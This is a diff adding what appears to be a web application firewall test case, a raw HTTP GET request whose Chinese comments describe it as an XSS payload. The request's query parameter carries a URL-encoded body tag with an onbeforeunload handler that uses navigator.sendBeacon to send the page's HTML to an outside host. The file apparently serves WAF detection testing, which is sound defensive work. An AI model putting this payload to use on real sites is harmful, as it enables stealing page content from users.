@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_body标签_onbeforeunload事件-06506559
+# 攻击载荷利用了HTML中的body标签和onbeforeunload属性，通过使用navigator.sendBeacon方法，以异步方式发送POST请求，将页面的HTML内容发送到指定的URL。如果 url 改变后触发
+GET /?id=%3Cbody%20onbeforeunload=navigator.sendBeacon%28%27%2F%2Fhttps:%2F%2Fbaidu.com%2F%27%2Cdocument.body.innerHTML%29%3E&bid=hd_tag_m8mv269z HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv269z
+RM-PRO-Token: 1d390a77b079e3f6a209d932509b6f13
+RM-PRO-Time: 1742808563556
+User-Agent: curl/7.83.1
+
